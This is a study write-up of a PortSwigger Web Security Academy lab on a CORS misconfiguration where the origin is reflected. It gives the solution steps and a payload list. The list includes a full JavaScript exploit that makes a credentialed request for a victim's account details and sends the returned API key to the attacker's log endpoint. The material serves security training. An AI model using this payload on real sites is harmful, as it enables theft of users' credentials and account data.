# Lab: CORS vulnerability with basic origin reflection

**Official PortSwigger URL:** https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

**Lab idea:** This challenge concerns a CORS policy that trusts origins too broadly. It practices recognizing how origin reflection and credentialed cross-origin access can expose a user's sensitive account data when the browser is allowed to read the response.

## Vulnerability in brief
Cross-origin resource sharing (CORS) is a browser mechanism that lets a server selectively permit web pages from other origins to read its resources. It relaxes the same-origin policy (SOP), which otherwise restricts cross-origin access to responses. CORS is a security-sensitive trust configuration, not a general defense against cross-site request forgery (CSRF).

## Solution idea
1. Check intercept is off, then use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it…
3. Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
4. Observe that the origin is reflected in the Access-Control-Allow-Origin header.
5. In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL: <script> var req = new XMLHttpRequest(); req.onload = reqListener…
6. Click View exploit .
7. Go back to the exploit server and click Deliver exploit to victim .
8. Click Access log , retrieve and submit the victim's API key to complete the lab.

## Payloads / key values
- `/accountDetails`
- `Access-Control-Allow-Credentials`
- `Origin: https://example.com`
- `Access-Control-Allow-Origin`
- `YOUR-LAB-ID`
- `<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>`

## Official source
- [PortSwigger Academy: Lab: CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
